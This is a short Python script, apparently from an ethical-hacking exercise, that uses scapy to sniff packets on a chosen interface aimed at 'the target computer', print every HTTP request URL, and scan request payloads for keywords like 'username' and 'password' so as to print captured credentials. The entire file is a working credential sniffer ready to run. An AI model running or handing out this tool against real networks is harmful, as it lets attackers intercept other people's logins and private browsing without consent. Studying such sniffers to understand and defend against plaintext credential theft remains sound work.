#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse
# from scapy_http import *


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i" , "--interface", dest="interface", help="Interface on which the target computer is on")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, type --help for more info")
    return options

def snif(interfce):
    scapy.sniff(iface=interfce, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_logininfo(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "uname", "login", "password", "pass", "passwrd"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))  #you can also do url.decode()

        loginInfo = get_logininfo(packet)
        if loginInfo:
            print("\n\n[+] Possible Username/Password > " + loginInfo + "\n\n")



options = get_arguments()
snif(options.interface)

